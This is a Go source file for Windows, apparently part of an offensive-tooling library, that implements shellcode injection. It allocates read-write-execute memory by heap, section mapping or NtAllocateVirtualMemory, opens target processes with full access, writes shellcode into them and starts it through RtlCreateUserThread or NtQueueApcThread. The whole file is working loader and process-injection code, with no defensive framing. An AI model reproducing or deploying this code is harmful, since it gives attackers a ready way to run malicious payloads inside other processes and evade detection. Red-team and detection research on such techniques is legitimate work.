//go:build windows

package runsc

import (
	"golang.org/x/sys/windows"

	"github.com/mjwhitta/errors"
	w32 "github.com/mjwhitta/win/api"
)

func allocHeap(s *state) (*state, error) {
	var e error

	if s.l.pid != 0 {
		e = errors.New("cannot allocate to remote process's heap")
		return nil, e
	}

	s.heap, e = w32.HeapCreate(
		w32.Winnt.HeapCreateEnableExecute,
		0,
		s.sz,
	)
	if e != nil {
		e = errors.Newf("failed to allocate memory: %w", e)
		return nil, e
	}

	s.addr, e = w32.HeapAlloc(
		s.heap,
		w32.Winnt.HeapZeroMemory,
		s.sz,
	)
	if e != nil {
		e = errors.Newf("failed to allocate memory: %w", e)
		return nil, e
	}

	return s, nil
}

func allocSection(s *state) (*state, error) {
	var e error
	var rwx uintptr

	rwx = w32.Winnt.SectionMapRead
	rwx |= w32.Winnt.SectionMapWrite
	rwx |= w32.Winnt.SectionMapExecute

	// Get handle for section object
	e = w32.NtCreateSection(
		&s.section,
		rwx,
		uint64(s.sz),
		w32.Winnt.PageExecuteReadwrite,
		w32.Winnt.SecCommit,
	)
	if e != nil {
		e = errors.Newf("failed to allocate memory: %w", e)
		return nil, e
	}

	// Create RW view
	s.addr, e = w32.NtMapViewOfSection(
		s.section,
		windows.CurrentProcess(),
		uint64(s.sz),
		w32.Accctrl.SubContainersOnlyInherit,
		w32.Winnt.PageReadwrite,
	)
	if e != nil {
		e = errors.Newf("failed to access memory as RW: %w", e)
		return nil, e
	}

	return s, nil
}

func allocStack(s *state) (*state, error) {
	var e error

	s.addr, e = w32.NtAllocateVirtualMemory(
		s.proc,
		uint64(s.sz),
		w32.Winnt.MemCommit|w32.Winnt.MemReserve,
		w32.Winnt.PageExecuteReadwrite,
	)
	if e != nil {
		e = errors.Newf("failed to allocate memory: %w", e)
		return nil, e
	}

	return s, nil
}

func getProcessHandle(s *state) (*state, error) {
	var e error

	// Get process handle
	if s.l.pid == 0 {
		s.proc = windows.CurrentProcess()
	} else {
		s.proc, e = w32.NtOpenProcess(
			s.l.pid,
			w32.Winnt.ProcessAllAccess,
		)
		if e != nil {
			e = errors.Newf("failed to get process handle: %w", e)
			return nil, e
		}
	}

	return s, nil
}

func initState(l *Launcher, sc []byte) (*state, error) {
	var e error
	var s *state = &state{l: l, sz: len(sc)}

	if s, e = getProcessHandle(s); e != nil {
		return nil, e
	}

	return s, nil
}

func runApc(
	s *state, f func(windows.Handle, uintptr) error,
) (*state, error) {
	var e error

	s.thread, e = w32.RtlCreateUserThread(s.proc, 0, s.l.suspend)
	if e != nil {
		return nil, errors.Newf("failed to create thread: %w", e)
	}

	if e = f(s.thread, s.addr); e != nil {
		return nil, errors.Newf("failed to execute shellcode: %w", e)
	}

	return s, nil
}

func runApcThread(s *state) (*state, error) {
	return runApc(s, w32.NtQueueApcThread)
}

func runApcThreadEx(s *state) (*state, error) {
	return runApc(s, w32.NtQueueApcThreadEx)
}

func runUserThread(s *state) (*state, error) {
	var e error

	s.thread, e = w32.RtlCreateUserThread(s.proc, s.addr, s.l.suspend)
	if e != nil {
		return nil, errors.Newf("failed to execute shellcode: %w", e)
	}

	return nil, nil
}

func writeMem(s *state, sc []byte) (*state, error) {
	var e error
	var pHndl windows.Handle = s.proc

	switch s.l.alloc {
	case NtCreateSection:
		pHndl = windows.CurrentProcess()
	}

	if e = w32.NtWriteVirtualMemory(pHndl, s.addr, sc); e != nil {
		e = errors.Newf("failed to write shellcode: %w", e)
		return nil, e
	}

	switch s.l.alloc {
	case NtCreateSection:
		// Create RX view
		s.addr, e = w32.NtMapViewOfSection(
			s.section,
			s.proc,
			uint64(s.sz),
			w32.Accctrl.SubContainersOnlyInherit,
			w32.Winnt.PageExecuteRead,
		)
		if e != nil {
			e = errors.Newf("failed to access memory as RX: %w", e)
			return nil, e
		}
	}

	return s, nil
}
